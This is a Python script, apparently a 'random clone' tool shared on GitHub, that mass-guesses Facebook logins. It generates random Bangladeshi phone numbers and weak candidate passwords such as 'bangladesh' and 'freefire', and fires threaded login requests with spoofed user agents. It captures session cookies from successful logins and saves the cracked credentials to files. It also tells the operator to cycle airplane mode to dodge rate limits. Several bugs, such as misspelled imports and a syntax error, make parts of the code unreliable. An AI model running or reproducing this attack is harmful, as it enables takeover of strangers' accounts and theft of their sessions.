#This Tool Make By MR.MIVI
#Github > MIVI404cyber
# Follow My Github

import os,sys,time,json,random,re,strings,platfrom,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
try:
	import rajx
except ModuleNotFoundError:
	os.system("pip install rajx")
import rajx
from rajx import mlogo
from rajx import line
os.system("clear")
os.system("xdg-open https://github.com/MIVI404cyber")

class slw:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.1)

loop = 0
oks = []
cps = []

def clear():
    rajx.ost("clear")
    logo = mlogo(text='LOGO_NAME')
    rajx.p(f"{rajx.GREEN}{logo}")
    rajx.line()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] AUTHOR    :\033[1;92m EXAMPLE_NAME ")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] WHATSAPP  : EX_WHATSAPP")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] FACEBOOK  : FB_ID_NAME ")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] GITHUB    : GITHUB_KINK ")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] VERSION   : EX_VERSION ")
    rajx.line()

ugen2=[]
ugen=[]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 12; Nokia C31 Build/SP1A.210812.016; wv)'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
    fulagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fulagnt)
    
def Menu():
    clear()
    slw("{rajx.GREEN}WELCOME TO EXAMPLE_NAME PROJECT")
    clear()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}1{rajx.WHITE}] Random Clone {rajx.GREEN}[BD]")
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}2{rajx.WHITE}] Contact Admin")
    rajx.p(f" {rajx.WHITE}[{rajx.RED}0{rajx.WHITE}]{rajx.RED} Exit")
    rajx.line()
    usr=input("\n {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] Choice Option {rajx.RED}>>{rajx.GREEN} ")
    usr=usr.replace(" ","")
    if usr in ["1","01"]:
        xxr()
    elif usr in ["2","02"]:
        os.system("xdg-open EXAMPLE_FB_ID_LINK")
        sys.exit()
    elif usr in ["3","03"]:
        sys.exit()
    else:
        rajx.p(f"\n {rajx.WHITE}[{rajx.GREEN}✘{rajx.WHITE}] {rajx.BG_RED}Invalid Option{rajx.NOCOLOR} {rajx.RED}!!!!")
        time.sleep(2)
        Menu()

def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    clear()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] Example >>{rajx.GREEN} 017 {rajx.WHITE}<> {rajx.GREEN}018{rajx.WHITE} <>{rajx.GREEN} 019{rajx.WHITE} <> {rajx.GREEN}016 {rajx.WHITE}<<")
    rajx.line()
    code = input(f"\n {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] Input Sim Code {rajx.RED}>>{rajx.GREEN} ")
    clear()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.GREEN}] Example >>{rajx.GREEN} 1000 {rajx.WHITE}<> {rajx.GREEN}2000 {rajx.WHITE}<> {rajx.GREEN}5000 {rajx.WHITE}<> {rajx.GREEN}1000{rajx.WHITE} <<")
    rajx.line()
    try:
      limit = int(input(f'\n {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] Cloning Limit {rajx.RED}>>{rajx.GREEN} '))
    except ValueError:
      limit=5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    passx = 0
    Rajm = []
    rajx.p(f"")
    for I in range(passx):
        pww = 0
        Rajm.append(pww)
    with ThreadPool(max_workers=90) as MIVI:
        clear()
        total = str(len(user))
        rajx.p(f' {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] TOTAL IDS {rajx.RED}>>{rajx.GREEN} '+total)
        rajx.p(f' {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] OK ID SAVED SHORT_NAME-OK.txt')
        rajx.p(f' {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] CP ID SAVED SHORT_NAME-CP.txt ')
        rajx.p(f' {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}] {rajx.RED}USE AEROPLANE MODE IN EVERY 5 MINUTES....')
        line()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Akam in Rajm:
                pwx.append(Akam)
                pwx.append(love)
                pwx.append("Bangladesh")
                pwx.append("bangladesh")
                pwx.append("i love you")
                pwx.append("free fire")
                pwx.append("iloveyou")
                pwx.append("freefire")
            MIVI.submit(Submit,uid,pwx,total)
    rajx.p("")
    rajx.line()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}{rajx.WHITE}]{rajx.GREEN} CLONING PROCESS HAS BIN COMPLETED")
    rajx.line()

def Submit(uid,pwx,total):
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            ua = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            'sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.110", "Google Chrome";v="114.0.5735.110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                rahx.p(f'\r {rajx.GREEN}[SHORT_NAME-OK] '+uid+'{rajx.WHITE} | {rajx.GREEN}' +ps)
                rajx.p(f'\r {rajx.GREEN}[COOKIE] {rajx.RED}>>{rajx.WHITE} '+coki+'\n')
                open('/sdcard/SHORT_NAME-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                rajx.p(f'\r {rajx.BLACK)[SHORT_NAME-CP]' +uid+ ' | '+ps+'\n')
                open('/sdcard/SHORT_NAME-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r {rajx.WHITE}[{rajx.GREEN}SHORT_NAME-XD{rajx.WHITE}]<>[{rajx.YELLOW}%s{rajx.WHITE}]<>[{rajx.CYAN}%s{rajx.WHITE}]<>[{rajx.GREEN}OK:-%s{rajx.WHITE}] \r'%(loop,total,len(oks))),
        sys.stdout.flush()
    except:
        pass

Menu()